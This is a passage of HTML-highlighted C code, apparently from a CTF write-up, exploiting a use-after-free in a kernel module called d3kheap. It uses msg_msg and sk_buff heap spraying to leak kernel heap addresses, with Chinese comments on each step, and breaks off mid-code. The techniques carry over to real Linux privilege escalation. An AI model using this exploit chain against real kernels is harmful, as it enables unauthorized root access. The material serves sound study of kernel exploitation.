punctuation\">(</span><span class=\"token keyword\">int</span> msqid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>msgp<span class=\"token punctuation\">,</span> size_t msgsz<span class=\"token punctuation\">,</span> <span class=\"token keyword\">long</span> msgtyp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">msgrcv</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">,</span> msgp<span class=\"token punctuation\">,</span> msgsz <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msgtyp<span class=\"token punctuation\">,</span> MSG_COPY <span class=\"token operator\">|</span> IPC_NOWAIT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 读取而不释放</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> sk_socket<span class=\"token punctuation\">[</span>SOCKET_NUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> size_t size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> SOCKET_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> SK_BUFF_NUM<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>sk_socket<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 控制大堆块</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">freeSkBuff</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> sk_socket<span class=\"token punctuation\">[</span>SOCKET_NUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> size_t size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> SOCKET_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> SK_BUFF_NUM<span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>sk_socket<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    msg_msg  <span class=\"token operator\">*</span>nearby_msg <span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>nearby_msg_prim <span class=\"token punctuation\">;</span>\n    pipe_buffer <span class=\"token operator\">*</span>pipe_buf_ptr<span class=\"token punctuation\">;</span>\n    uint64_t victim_addr <span class=\"token punctuation\">;</span>\n    uint64_t <span class=\"token operator\">*</span>rop <span class=\"token punctuation\">;</span>\n    cpu_set_t cpu_set<span class=\"token punctuation\">;</span>\n    pipe_buf_operations <span class=\"token operator\">*</span>ops_ptr<span class=\"token punctuation\">;</span>\n    \n\n    <span class=\"token keyword\">int</span> pipe_fd<span class=\"token punctuation\">[</span>PIPE_NUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> sk_sockets<span class=\"token punctuation\">[</span>SOCKET_NUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> msqid<span class=\"token punctuation\">[</span>MSG_QUEUE_NUM<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> victim_qid <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// __sock_create</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">CPU_ZERO</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cpu_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">CPU_SET</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>cpu_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">sched_setaffinity</span><span class=\"token punctuation\">(</span><span class=\"token function\">getpid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>cpu_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>cpu_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>SOCKET_NUM <span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">socketpair</span><span class=\"token punctuation\">(</span>AF_UNIX <span class=\"token punctuation\">,</span> SOCK_STREAM <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> sk_sockets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 创建后续利用需要的 sk 结构体</span>\n\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/d3kheap\"</span> <span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> MSG_QUEUE_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        msqid<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">msgget</span><span class=\"token punctuation\">(</span>IPC_PRIVATE<span class=\"token punctuation\">,</span> <span class=\"token number\">0666</span> <span class=\"token operator\">|</span> IPC_CREAT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 创建大量 msg_queue 结构体，后面会和 msg_msg 链起来</span>\n\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>primary_msg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>primary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span> MSG_QUEUE_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>primary_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MSG_TAG<span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>primary_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">writeMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>primary_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>primary_msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span>PRIMARY_MSG_TYPE <span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"send primary msg error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>secondary_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MSG_TAG<span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>secondary_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">writeMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>secondary_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>secondary_msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span>SECONDARY_MSG_TYPE <span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"send secondary msg error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mod_buf_pointer &lt;--> msg_msg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// msgsnd 发送大量信息，此时会申请 msg_msg 结构体</span>\n    <span class=\"token comment\">// 其中第二次申请的 msg_msg 大小为 1024 ，很大可能会申请到中间 模块 释放的堆块</span>\n\n    <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 此时让 secondary msg 释放进入 slub-1024</span>\n\n    <span class=\"token function\">buildMsg</span><span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_secondary_msg<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        SECONDARY_MSG_SIZE <span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 创建 fake msg_msg, 破坏 msg_msg 用于找出 msg_msg</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span>sk_sockets <span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to spray sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"msg_msg &lt;--> sk_buf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 通过 sk 结构体申请大量 1024 的结构体，此时有极大可能申请到刚刚释放出去的堆块</span>\n    <span class=\"token comment\">// 此时某一块 msg_msg 和 sk_buf 为同一个指针</span>\n    <span class=\"token comment\">// 并向其中放置了 fake msg_msg </span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> MSG_QUEUE_NUM<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">peekMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            victim_qid <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">lg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"victim_qid\"</span> <span class=\"token punctuation\">,</span> victim_qid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// 通过 msgrcv 找出已经被破坏掉的 msg_msg 结构体</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">freeSkBuff</span><span class=\"token punctuation\">(</span>sk_sockets <span class=\"token punctuation\">,</span> fake_secondary_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to release sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 清空 sk_buf </span>\n\n    <span class=\"token function\">buildMsg</span><span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_secondary_msg<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        VICTIM_MSG_TYPE<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1000</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">msg_msg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 修改 fake msg_msg 的 type 并改大 size 从而可以泄露出 堆地址</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span>sk_sockets <span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to spray sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"msg_msg &lt;--> sk_buf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 再次堆喷将 sk 的 object 和 msg_msg 连接</span>\n    <span class=\"token comment\">// 此时再次修改 msg_msg</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">peekMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>victim_qid<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>oob_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>oob_msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to read victim msg!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>oob_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span>SECONDARY_MSG_SIZE<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> MSG_TAG<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to rehit the UAF object!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    nearby_msg <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>oob_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span>SECONDARY_MSG_SIZE <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>msg_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 找出泄露出的下一个结构体，从而泄露出 msg_queue</span>\n\n    <span class=\"token function\">lg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"msg_queue_addr\"</span> <span class=\"token punctuation\">,</span> nearby_msg<span class=\"token operator\">-></span>m_list<span class=\"token punctuation\">.</span>prev<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">freeSkBuff</span><span class=\"token punctuation\">(</span> sk_sockets<span class=\"token punctuation\">,</span>fake_secondary_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to release sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">buildMsg</span><span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_secondary_msg<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        VICTIM_MSG_TYPE<span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>oob_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span>\n        nearby_msg<span class=\"token operator\">-></span>m_list<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 将指针指向 msg_queue 从而泄露出当前 msg_msg 的指针</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">spraySkBuff</span><span class=\"token punctuation\">(</span>sk_sockets <span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to spray sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 再次堆喷 sk object 修改 msgmsg </span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">peekMsg</span><span class=\"token punctuation\">(</span>msqid<span class=\"token punctuation\">[</span>victim_qid<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>oob_msg <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>oob_msg<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to read victim msg!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>oob_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> MSG_TAG<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to rehit the UAF object!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    nearby_msg_prim <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>msg_msg <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>oob_msg<span class=\"token punctuation\">.</span>mtext<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span> <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>msg_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    victim_addr <span class=\"token operator\">=</span> nearby_msg_prim<span class=\"token operator\">-></span>m_list<span class=\"token punctuation\">.</span>next <span class=\"token operator\">-</span> <span class=\"token number\">0x400</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">lg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"victim_addr\"</span> <span class=\"token punctuation\">,</span>victim_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 读出 msgmsg 的指向泄露出 msgmsg 的地址</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">freeSkBuff</span><span class=\"token punctuation\">(</span>sk_sockets<span class=\"token punctuation\">,</span> fake_secondary_msg<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to release sk_buff!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>fake_secondary_msg <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>fake_secondary_msg<span class=\"token 